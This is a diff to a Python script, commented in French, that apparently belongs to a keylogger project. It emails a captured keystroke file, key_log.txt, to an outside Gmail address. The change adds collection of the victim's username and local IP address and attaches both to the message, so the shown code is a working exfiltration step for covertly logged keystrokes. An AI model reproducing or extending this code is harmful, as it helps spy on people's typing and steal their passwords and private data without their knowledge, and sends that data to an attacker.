@@ -5,6 +5,10 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import socket
+
+#recuperer le nom d'utilisateur
+USER_NAME = getpass.getuser()
 
 #Initialisation 
 fromaddr = "keylogger.projet@gmail.com"
@@ -19,9 +23,12 @@ msg['From'] = fromaddr
 msg['To'] = toaddr
 msg['Subject'] = "Bonjour, vous trouverez ci joint le fichier key_log.txt, Bonne journee!"
 
+m = "Nom d'utilisateur %s" % USER_NAME
+
 #message envoye avec le fichier key_log.txt
-body = "fichier envoye avec succes"
+body = "Fichier envoye avec succes \n Adresse IP %s\n" % [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][0]  
 msg.attach(MIMEText(body, 'plain'))
+msg.attach(MIMEText(m, 'plain'))
 
 filename = "key_log.txt"
 attachment = open(filename, "rb")
